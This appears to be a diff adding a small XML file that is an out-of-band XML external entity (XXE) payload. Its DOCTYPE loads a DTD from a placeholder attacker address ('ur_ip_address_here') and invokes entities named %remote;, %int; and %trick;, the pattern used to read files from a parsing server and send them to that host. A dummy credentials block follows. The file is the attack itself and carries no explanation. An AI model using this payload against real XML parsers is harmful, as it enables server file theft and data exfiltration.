@@ -1,0 +1,6 @@
+<!DOCTYPE convert [ <!ENTITY % remote SYSTEM"http://ur_ip_address_here:80/file.dtd">%remote;%int;%trick;]>
+
+<creds>
+    <user>blah</user>
+    <pass>mypass</pass>
+</creds>
